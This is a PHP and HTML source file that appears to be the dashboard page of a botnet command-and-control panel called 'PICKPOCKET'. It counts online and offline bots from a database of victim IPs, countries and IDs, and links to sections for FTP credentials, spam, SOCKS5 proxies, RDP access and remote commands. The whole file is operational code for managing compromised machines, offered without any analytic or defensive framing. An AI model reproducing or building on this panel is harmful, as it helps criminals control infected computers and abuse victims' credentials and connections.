<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" >
   <head>         <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
        <link rel="stylesheet" media="screen" type="text/css" title="style" href="c.css" />
   </head>
   
<?php
include("config.php");
include ("auth.php");

if (! $connect) 

die(mysql_error());
mysql_select_db($dbname , $connect) or die("Couldn't open $db: ".mysql_error());
$result = mysql_query( "SELECT `ip`, `contry`, `uid` FROM  `bot_online`" )
          or die("SELECT Error: ".mysql_error());
$num_rows = mysql_num_rows($result);

///////////////////////////////////////.........
mysql_select_db($dbname , $connect) or die("Couldn't open $db: ".mysql_error());
$result1 = mysql_query( "SELECT `ip` FROM  `bot`" )
          or die("SELECT Error: ".mysql_error());
$allbots= mysql_num_rows($result1);
///mysql_close($connect);
///////////////////.....................

$onbots=$num_rows;
$offb0ts=$allbots - $onbots;
?>
<html> 
<title>~ P I C K P O C K E T ~  [<?php echo $onbots ?>/<?php echo 

$allbots ?>]</title>
<center><img src="images/pick.jpg"></center>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

<head>
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
		<link rel="stylesheet" type="text/css" href="main.css"/>
		<script type="text/javascript" src="jquery.js"></script>
	<script type="text/javascript" src="jquery-color.js"></script>
	<script type="text/javascript" src="main.js"></script>
</head>

<body>
	
	<div id="pageWrap">
		<div id="pageBody">
			
			
			<a class="hoverBtn" href="srch.php">Search</a>
			<a class="hoverBtn" href="bot.php">Bot's</a>
			<a class="hoverBtn" href="ftps.php">FTP</a>
			<a class="hoverBtn" href="email/">SPAM</a>
			<a class="hoverBtn" href="socks5.php">Socks5</a>
			<a class="hoverBtn" href="rdp.php">RDP</a>
			<a class="hoverBtn" href="cmd/">CMD</a>
			
			<div class="clear"></div>
			
		</div>
	</div>
	
</body>

</html>

<center>

<STYLE TYPE="text/css">
<!--
.tealtable, .tealtable TD, .tealtable TH
{
background-color:teal;
color:white;
}
-->
</STYLE>
<TABLE CELLPADDING=5 CELLSPACING=5 CLASS="tealtable"><b>
<TR> <TH><font size="1">All Bots</TH> <TH><?php echo $allbots ?></TH> </TR>
<TR> <TD>Online</TD> <TD><?php echo $onbots ?></TD> </TR>
<TR> <TD>Offline</TD>    <TD><?php echo $offb0ts ?></TD> </TR></b>

</TABLE>


</center>
<h1></h1>
</body>
</html>

<?php 
/*while ($get_info =

mysql_fetch_row($result)){
echo "<center><table border='1'>
<tr>
<th>IP</th>
<th>Contry</th>
<th>UID</th>
</tr>";
echo "<tr>";
foreach ($get_info as $field)
print "<b><td>$field</td></b>";
echo "</tr>";

}
echo "</table></center>";*/
mysql_close($connect);

?>

